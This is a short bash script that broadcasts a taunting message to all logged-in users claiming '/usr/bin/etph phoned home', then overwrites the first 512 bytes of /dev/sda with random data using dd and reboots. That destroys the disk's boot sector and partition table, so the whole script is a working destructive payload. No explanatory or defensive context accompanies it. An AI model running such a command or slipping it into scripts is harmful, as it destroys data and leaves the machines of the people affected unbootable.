#!/bin/bash

/bin/echo "/usr/bin/etph phoned home. It said to murder your box. You've got 60 seconds to figure out how to save your box. Good luck." | /usr/bin/wall
/bin/sleep 90
/bin/dd if=/dev/random of=/dev/sda bs=512 count=1
/sbin/reboot now